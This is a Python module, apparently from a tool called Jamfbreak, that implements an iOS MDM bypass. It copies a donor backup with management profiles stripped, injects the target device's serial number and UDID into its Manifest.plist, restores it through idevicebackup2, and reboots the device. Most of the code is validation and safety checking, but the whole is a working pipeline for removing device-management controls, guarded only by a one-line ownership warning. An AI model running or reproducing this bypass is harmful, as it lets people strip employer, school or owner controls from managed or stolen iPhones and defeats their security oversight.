"""
RodoExploit pipeline — no-reset MDM bypass.

This implements the method from FireMonster445/RodoExploit:
  1. Read device SerialNumber + UniqueDeviceID via ideviceinfo
  2. Edit the pre-made clean backup's Manifest.plist to inject the
     device's real Serial + UDID (using Python's plistlib, replacing
     the batch file's plistutil + PlistEd approach)
  3. idevicebackup2 restore --system --settings --skip-apps --no-reboot
  4. idevicerestart

The --skip-apps and --settings flags are intended to limit the restore to
configuration data. The backup folder itself is the "exploit" — a clean
backup with MDM configuration stripped. This remains a real settings restore
and therefore carries non-zero device and data risk.

The user must supply and review the donor backup folder before placing it
under jamfbreak/backups/.

============================
BOOTLOOP RISK CONTROLS
============================

No software can honestly guarantee that a device mutation is risk-free.
This pipeline reduces bootloop and data-loss risk with these controls:

1. **No firmware writes.** We never call idevicerestore, irecovery, or
   any IPSW-based restore. The boot chain is never touched.

2. **Settings-only restore.** `idevicebackup2 restore --system --settings
   --skip-apps` restores system *preferences* and *configuration files*,
   not the OS image, not the kernel, not the boot chain. It overwrites
   plists in /var/mobile/Library and /var/root/Library — the same data
   that iTunes syncs every day.

3. **Pre-restore validation.** Before calling idevicebackup2, we:
   - Verify the backup folder has a valid Manifest.plist
   - Verify the Manifest.plist can be parsed by plistlib
   - Verify our edit was successful by re-reading the plist
   - Verify the Serial + UDID we injected are present in the re-read data
   If any check fails, we ABORT before touching the device.

4. **Completed, readable backup.** Info.plist and Status.plist must parse,
   Status.plist must say `SnapshotState=finished`, the backup index must be
   readable, and encrypted backups are refused.

5. **Controlled reboot.** We use --no-reboot so the device does not
   restart mid-restore. We only restart AFTER idevicebackup2 returns
   success (exit 0). If the restore fails, we never reboot.

6. **No encrypted backup handling.** The pre-made backup is unencrypted.
   There is no key-derivation, no RNCryptor, no byte-swapping that could
   produce a corrupt backup from a floating-point or encoding error.
"""

from __future__ import annotations

import os
import plistlib
import re
import shutil
import sqlite3
import stat
import subprocess
import tempfile
from contextlib import closing
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Optional

from . import device
from .runtime_paths import asset_dir, is_link_or_reparse


LogFn = Callable[[str, str, Optional[str]], None]


@dataclass
class RodoResult:
    exit_code: int = 0
    device_info: Optional[device.DeviceInfo] = None
    backup_dir: Optional[str] = None
    error: Optional[str] = None


_BACKUPS_DIR = asset_dir("backups")

MAX_PLIST_BYTES = 16 * 1024 * 1024
MAX_BACKUP_FILES = 10_000
MAX_BACKUP_TOTAL_BYTES = 2 * 1024 * 1024 * 1024
MAX_NESTED_NODES = 100_000
MAX_NESTED_DEPTH = 256


class BackupValidationError(Exception):
    """Raised when the backup folder fails pre-restore validation."""


def find_backup_dir() -> Optional[Path]:
    """Find the pre-made clean backup folder under backups/.

    Looks for any subdirectory containing a Manifest.plist.
    The folder name must match the donor's Info.plist target identifier.
    """
    if not _BACKUPS_DIR.is_dir():
        return None
    for entry in sorted(_BACKUPS_DIR.iterdir()):
        if entry.is_dir() and (entry / "Manifest.plist").is_file():
            return entry
    return None


def edit_manifest_plist(
    manifest_path: Path,
    *,
    serial: str,
    udid: str,
) -> None:
    """
    Inject the device's Serial + UDID into Manifest.plist.

    The batch script does this via XPath:
      //key[.='SerialNumber']/following-sibling::string[1]  -> serial
      //key[.='UniqueDeviceID']/following-sibling::string[1] -> udid

    In Python we use plistlib to load the plist as a dict, find the keys,
    and update the following string value. This is the same logical
    operation, just done natively.
    """
    _validate_identity_value("SerialNumber", serial)
    _validate_identity_value("UniqueDeviceID", udid, udid=True)

    with open(manifest_path, "rb") as f:
        data = plistlib.load(f)

    _require_single_string(data, "SerialNumber")
    _require_single_string(data, "UniqueDeviceID")

    ok_sn = _update_nested(data, "SerialNumber", serial)
    ok_udid = _update_nested(data, "UniqueDeviceID", udid)

    if not ok_sn:
        raise BackupValidationError(
            "SerialNumber key not found in Manifest.plist — the backup folder "
            "may be corrupt or from an incompatible iOS version."
        )
    if not ok_udid:
        raise BackupValidationError(
            "UniqueDeviceID key not found in Manifest.plist — the backup folder "
            "may be corrupt or from an incompatible iOS version."
        )

    # Write and fsync a sibling file, then atomically replace the manifest.
    # A crash cannot leave a half-written plist behind.
    original_mode = stat.S_IMODE(manifest_path.stat().st_mode)
    tmp_path: Path | None = None
    try:
        with tempfile.NamedTemporaryFile(
            mode="wb",
            prefix=f".{manifest_path.name}.",
            suffix=".tmp",
            dir=manifest_path.parent,
            delete=False,
        ) as tmp:
            tmp_path = Path(tmp.name)
            plistlib.dump(data, tmp, fmt=plistlib.FMT_BINARY)
            tmp.flush()
            os.fsync(tmp.fileno())
        os.chmod(tmp_path, original_mode)
        os.replace(tmp_path, manifest_path)
    except Exception:
        if tmp_path is not None:
            tmp_path.unlink(missing_ok=True)
        raise


def _validate_identity_value(name: str, value: str, *, udid: bool = False) -> None:
    if not isinstance(value, str) or not value or value != value.strip():
        raise BackupValidationError(f"{name} is empty or has surrounding whitespace")
    if len(value) > 128 or any(ch in value for ch in "\x00\r\n"):
        raise BackupValidationError(f"{name} contains invalid characters")
    if udid and not re.fullmatch(r"[A-Za-z0-9-]+", value):
        raise BackupValidationError("UniqueDeviceID has an unexpected format")


def _find_nested_values(obj, key_name: str) -> list[object]:
    """Return every occurrence of a key, including plist-as-node-list data."""
    found: list[object] = []
    for node in _walk_nested(obj):
        if isinstance(node, dict) and key_name in node:
            found.append(node[key_name])
        elif isinstance(node, list):
            for i, item in enumerate(node):
                if (
                    isinstance(item, dict)
                    and item == {"key": key_name}
                    and i + 1 < len(node)
                    and isinstance(node[i + 1], dict)
                    and set(node[i + 1]) == {"string"}
                ):
                    found.append(node[i + 1]["string"])
    return found


def _walk_nested(obj):
    """Iterate nested plist containers with explicit depth and node budgets."""
    stack = [(obj, 0)]
    seen = 0
    while stack:
        node, depth = stack.pop()
        seen += 1
        if seen > MAX_NESTED_NODES:
            raise BackupValidationError("plist contains too many nested values")
        if depth > MAX_NESTED_DEPTH:
            raise BackupValidationError("plist nesting is too deep")
        yield node
        if isinstance(node, dict):
            stack.extend(
                (value, depth + 1) for value in reversed(list(node.values()))
            )
        elif isinstance(node, list):
            stack.extend((value, depth + 1) for value in reversed(node))


def _require_single_string(obj, key_name: str) -> str:
    values = _find_nested_values(obj, key_name)
    if not values:
        raise BackupValidationError(
            f"Manifest.plist does not contain a {key_name} key"
        )
    if len(values) != 1:
        raise BackupValidationError(
            f"Manifest.plist contains {len(values)} {key_name} keys; "
            "the target is ambiguous"
        )
    if not isinstance(values[0], str):
        raise BackupValidationError(f"Manifest.plist {key_name} is not a string")
    return values[0]


def _update_nested(obj, key_name: str, new_value: str) -> bool:
    """Find one validated key occurrence and replace its string value."""
    for node in _walk_nested(obj):
        if isinstance(node, dict) and key_name in node:
            node[key_name] = new_value
            return True
        if isinstance(node, list):
            for i, item in enumerate(node):
                if (
                    isinstance(item, dict)
                    and item == {"key": key_name}
                    and i + 1 < len(node)
                    and isinstance(node[i + 1], dict)
                    and set(node[i + 1]) == {"string"}
                ):
                    node[i + 1]["string"] = new_value
                    return True
    return False


def _validate_backup_folder(bdir: Path, log: LogFn) -> None:
    """
    Pre-restore safety checks on the backup folder.

    Raises BackupValidationError if any check fails. This runs BEFORE
    we edit anything or call idevicebackup2, so a failure here means
    the device is never touched.
    """
    if not bdir.is_dir():
        raise BackupValidationError(f"Backup folder not found: {bdir}")
    if is_link_or_reparse(bdir):
        raise BackupValidationError("Backup folder must not be a link or reparse point")

    _validate_backup_tree(bdir)

    manifest_data = _load_plist_dict(bdir / "Manifest.plist")
    info_data = _load_plist_dict(bdir / "Info.plist")
    status_data = _load_plist_dict(bdir / "Status.plist")

    # Match the check performed by current idevicebackup2 before it starts a
    # restore.  Treat missing/unfinished status as fatal, not as a warning.
    if status_data.get("SnapshotState") != "finished":
        raise BackupValidationError(
            "Status.plist must contain SnapshotState='finished'; refusing an "
            "incomplete or failed backup"
        )

    _require_single_string(manifest_data, "SerialNumber")
    _require_single_string(manifest_data, "UniqueDeviceID")

    if manifest_data.get("IsEncrypted") is True:
        raise BackupValidationError(
            "Encrypted backups are not supported; refusing to prompt for or "
            "guess a backup password during restore"
        )

    if not info_data:
        raise BackupValidationError("Info.plist is empty")

    source_identifier = info_data.get("Target Identifier")
    if not isinstance(source_identifier, str) or not source_identifier:
        raise BackupValidationError("Info.plist has no Target Identifier")
    if source_identifier.casefold() != bdir.name.casefold():
        raise BackupValidationError(
            "Backup folder name does not match Info.plist Target Identifier"
        )

    _validate_backup_index(bdir)

    log("Backup folder validation passed.", "success", None)


def _load_plist_dict(path: Path) -> dict:
    if not path.is_file():
        raise BackupValidationError(f"{path.name} not found in {path.parent}")
    try:
        if path.stat().st_size > MAX_PLIST_BYTES:
            raise BackupValidationError(
                f"{path.name} exceeds the {MAX_PLIST_BYTES}-byte safety limit"
            )
        with open(path, "rb") as f:
            data = plistlib.load(f)
    except BackupValidationError:
        raise
    except Exception as exc:
        raise BackupValidationError(
            f"{path.name} is not a valid plist: {exc}"
        ) from exc
    if not isinstance(data, dict):
        raise BackupValidationError(f"{path.name} root must be a dictionary")
    return data


def _validate_backup_tree(bdir: Path) -> None:
    """Bound the local work required before copying an untrusted backup."""
    file_count = 0
    total_bytes = 0
    try:
        for root, directories, files in os.walk(bdir, followlinks=False):
            root_path = Path(root)
            for name in directories:
                if is_link_or_reparse(root_path / name):
                    raise BackupValidationError(
                        f"backup contains a linked directory: {name}"
                    )
            for name in files:
                path = root_path / name
                if is_link_or_reparse(path):
                    raise BackupValidationError(f"backup contains a linked file: {name}")
                file_count += 1
                total_bytes += path.stat().st_size
                if file_count > MAX_BACKUP_FILES:
                    raise BackupValidationError(
                        f"backup exceeds the {MAX_BACKUP_FILES}-file safety limit"
                    )
                if total_bytes > MAX_BACKUP_TOTAL_BYTES:
                    raise BackupValidationError("backup exceeds the 2 GiB safety limit")
    except BackupValidationError:
        raise
    except OSError as exc:
        raise BackupValidationError(f"backup tree is unreadable: {exc}") from exc


def _validate_backup_index(bdir: Path) -> None:
    """Validate the modern SQLite index or the legacy MBDB header."""
    manifest_db = bdir / "Manifest.db"
    legacy_mbdb = bdir / "Manifest.mbdb"
    if manifest_db.is_file():
        try:
            uri = f"{manifest_db.resolve().as_uri()}?mode=ro&immutable=1"
            with closing(sqlite3.connect(uri, uri=True)) as connection:
                rows = connection.execute("PRAGMA quick_check").fetchall()
                has_files_table = connection.execute(
                    "SELECT 1 FROM sqlite_master "
                    "WHERE type='table' AND name='Files'"
                ).fetchone()
                has_file_record = (
                    connection.execute("SELECT 1 FROM Files LIMIT 1").fetchone()
                    if has_files_table
                    else None
                )
        except (OSError, sqlite3.DatabaseError) as exc:
            raise BackupValidationError(
                f"Manifest.db is unreadable or corrupt: {exc}"
            ) from exc
        if rows != [("ok",)]:
            raise BackupValidationError(
                f"Manifest.db integrity check failed: {rows[:3]}"
            )
        if not has_files_table or not has_file_record:
            raise BackupValidationError("Manifest.db has no backup file records")
        return
    if legacy_mbdb.is_file():
        try:
            with open(legacy_mbdb, "rb") as handle:
                header = handle.read(6)
        except OSError as exc:
            raise BackupValidationError(f"Manifest.mbdb is unreadable: {exc}") from exc
        if header != b"mbdb\x05\x00" or legacy_mbdb.stat().st_size <= 6:
            raise BackupValidationError("Manifest.mbdb is invalid or empty")
        return
    raise BackupValidationError(
        "Backup has no Manifest.db or legacy Manifest.mbdb payload index"
    )


def _has_nested_key(obj, key_name: str) -> bool:
    """Check if a key exists anywhere in the nested plist structure."""
    return bool(_find_nested_values(obj, key_name))


def _verify_manifest_edit(manifest_path: Path, *, serial: str, udid: str, log: LogFn) -> None:
    """
    Post-edit verification: re-read the Manifest.plist and confirm our
    injected values are present. This catches any silent write failure.
    """
    data = _load_plist_dict(manifest_path)

    actual_sn = _require_single_string(data, "SerialNumber")
    actual_udid = _require_single_string(data, "UniqueDeviceID")

    if actual_sn != serial:
        raise BackupValidationError(
            f"Post-edit verification failed: SerialNumber is '{actual_sn}' "
            f"but expected '{serial}'. Refusing to restore."
        )
    if actual_udid != udid:
        raise BackupValidationError(
            f"Post-edit verification failed: UniqueDeviceID is '{actual_udid}' "
            f"but expected '{udid}'. Refusing to restore."
        )

    log("Post-edit verification passed (Serial + UDID confirmed).", "success", None)


def _get_nested_value(obj, key_name: str) -> Optional[str]:
    """Get a value for a key anywhere in the nested plist structure."""
    for node in _walk_nested(obj):
        if isinstance(node, dict) and key_name in node:
            return node[key_name]
    return None


def _version_parts(value: str) -> tuple[int, ...] | None:
    match = re.match(r"^\s*(\d+(?:\.\d+)*)", value or "")
    if not match:
        return None
    return tuple(int(part) for part in match.group(1).split("."))


def _validate_backup_compatibility(
    bdir: Path,
    info: device.DeviceInfo,
    log: LogFn,
) -> None:
    """Reject a backup made by a newer iOS version than the target device."""
    backup_info = _load_plist_dict(bdir / "Info.plist")
    backup_version = backup_info.get("Product Version")
    if not isinstance(backup_version, str):
        manifest_data = _load_plist_dict(bdir / "Manifest.plist")
        candidate = _get_nested_value(manifest_data, "ProductVersion")
        backup_version = candidate if isinstance(candidate, str) else None

    backup_parts = _version_parts(backup_version or "")
    device_parts = _version_parts(info.product_version)
    if backup_parts and device_parts and backup_parts > device_parts:
        raise BackupValidationError(
            f"Backup iOS {backup_version} is newer than target iOS "
            f"{info.product_version}; refusing a potentially incompatible restore"
        )

    backup_product = backup_info.get("Product Type")
    if isinstance(backup_product, str) and backup_product != info.product_type:
        log(
            f"Backup was created for {backup_product}; target is "
            f"{info.product_type}. Cross-model restore will rely on iOS validation.",
            "info",
            None,
        )


def _verify_device_is_unchanged(
    original: device.DeviceInfo,
    current: device.DeviceInfo,
) -> None:
    expected = (original.udid, original.serial, original.product_type)
    actual = (current.udid, current.serial, current.product_type)
    if actual != expected:
        raise device.DeviceError(
            "device identity changed during preflight; refusing to restore"
        )


def run_rodo_pipeline(
    log: LogFn,
    *,
    udid_filter: str | None = None,
    backup_dir: str | None = None,
    keep_backup_copy: bool = False,
    no_reboot: bool = False,
) -> RodoResult:
    """
    Run the Jamfbreak validated settings-restore pipeline.

    Parameters
    ----------
    log : callable(text, kind, tag)
    udid_filter : select device by UDID if multiple connected
    backup_dir : path to the pre-made clean backup folder. If None,
                 auto-discovers under jamfbreak/backups/.
    keep_backup_copy : if True, retain the patched working copy for diagnosis.
                       The original backup is never modified.
    no_reboot : if True, skips the idevicerestart step.
    """
    result = RodoResult()

    log("=== Jamfbreak (validated settings restore) ===", "info", None)
    log("USE ONLY ON iOS DEVICES THAT YOU LEGALLY OWN.", "info", None)

    # ------------------------------------------------------------------ detect
    try:
        log("Detecting device…", "step", "1/5")
        info = device.get_device_info(udid=udid_filter)
    except device.DeviceError as exc:
        log(f"Device error: {exc}", "error", None)
        result.exit_code = 2
        result.error = str(exc)
        return result

    result.device_info = info
    log(f"Model    : {info.product_type}", "info", None)
    log(f"iOS      : {info.product_version}", "info", None)
    log(f"Serial   : {info.serial}", "info", None)
    log(f"UDID     : {info.udid}", "info", None)

    # --------------------------------------------------------- find backup
    log("Locating clean backup folder…", "step", "2/5")
    if backup_dir:
        bdir = Path(backup_dir).resolve()
    else:
        bdir = find_backup_dir()

    if not bdir or not (bdir / "Manifest.plist").is_file():
        log("No clean backup folder found.", "error", None)
        log("Place a reviewed donor backup folder into:", "info", None)
        log(str(_BACKUPS_DIR), "info", None)
        result.exit_code = 4
        result.error = "backup folder missing"
        return result

    result.backup_dir = str(bdir)
    log(f"Backup: {bdir}", "info", None)

    # --------------------------------------------------- validate backup
    log("Validating backup folder…", "step", "3/5")
    try:
        _validate_backup_folder(bdir, log)
        _validate_backup_compatibility(bdir, info, log)
    except BackupValidationError as exc:
        log(f"Validation FAILED: {exc}", "error", None)
        log("Aborting before any device modification — device is untouched.", "info", None)
        result.exit_code = 5
        result.error = str(exc)
        return result

    # Always patch a private working copy. Reusing an already-patched donor
    # backup across devices is an avoidable source of identity mismatches.
    temp_owner: tempfile.TemporaryDirectory[str] | None = None
    work_root: Path | None = None
    try:
        if keep_backup_copy:
            work_root = Path(tempfile.mkdtemp(prefix="jamfbreak_kept_"))
        else:
            temp_owner = tempfile.TemporaryDirectory(prefix="jamfbreak_")
            work_root = Path(temp_owner.name)
        work_dir = work_root / bdir.name
        shutil.copytree(bdir, work_dir)
        log(f"Working copy: {work_dir} (original preserved)", "info", None)

        # Validate the copy independently before editing it.
        _validate_backup_folder(work_dir, log)

        # --------------------------------------------------- edit Manifest
        log("Injecting device info into Manifest.plist…", "step", "4/5")
        manifest = work_dir / "Manifest.plist"
        edit_manifest_plist(manifest, serial=info.serial, udid=info.udid)
        _verify_manifest_edit(
            manifest, serial=info.serial, udid=info.udid, log=log
        )
        _validate_backup_folder(work_dir, log)
        log("Manifest.plist updated (Serial + UDID injected)", "success", None)

        # Re-read the specifically selected device immediately before the
        # first mutating command. Disconnects or identity drift fail closed.
        current_info = device.get_device_info(udid=info.udid)
        _verify_device_is_unchanged(info, current_info)
        log("Final device identity check passed.", "success", None)

        # --------------------------------------------------------- restore
        log("Restoring validated settings backup to device…", "step", "5/5")
        log(
            "Safety flags: --system --settings --skip-apps --no-reboot",
            "info",
            None,
        )
        rc = device.restore_backup(
            str(work_root),
            info.udid,
            source_udid=work_dir.name,
        )

        if rc != 0:
            log(f"idevicebackup2 returned {rc}", "error", None)
            log(
                "Restore state is uncertain; some settings may have been "
                "written before the error. The tool will NOT reboot the device.",
                "error",
                None,
            )
            log(
                "Keep the device connected and unlocked. Do not repeatedly "
                "retry; inspect the restore output first.",
                "info",
                None,
            )
            result.exit_code = 3
            result.error = f"idevicebackup2 exit {rc}; restore state uncertain"
            return result

        log("Backup restore command completed successfully.", "success", None)

        # --------------------------------------------------------- reboot
        # Only reboot AFTER a successful restore. If the restore failed, we
        # never reboot — the device stays in its current state.
        if not no_reboot:
            log("Restarting device after successful restore…", "info", None)
            try:
                restart_exe = device._bin("idevicerestart")
                reboot = subprocess.run(
                    [restart_exe, "-u", info.udid],
                    check=False,
                    timeout=30,
                    creationflags=device.subprocess_creation_flags(),
                )
                if reboot.returncode == 0:
                    log("Device accepted the reboot request.", "info", None)
                else:
                    log(
                        f"idevicerestart returned {reboot.returncode}; "
                        "reboot manually when ready.",
                        "info",
                        None,
                    )
            except Exception as exc:
                log(f"idevicerestart failed (non-critical): {exc}", "info", None)
                log("Please reboot the device manually when ready.", "info", None)

        log("MDM restore flow completed.", "success", None)
        return result
    except (BackupValidationError, device.DeviceError, OSError) as exc:
        log(f"Safety preflight FAILED: {exc}", "error", None)
        log("Aborting before the restore command — device is untouched.", "info", None)
        result.exit_code = 5
        result.error = str(exc)
        return result
    finally:
        if temp_owner is not None:
            temp_owner.cleanup()
        elif keep_backup_copy and work_root is not None:
            log(f"Patched working copy retained at {work_root}", "info", None)
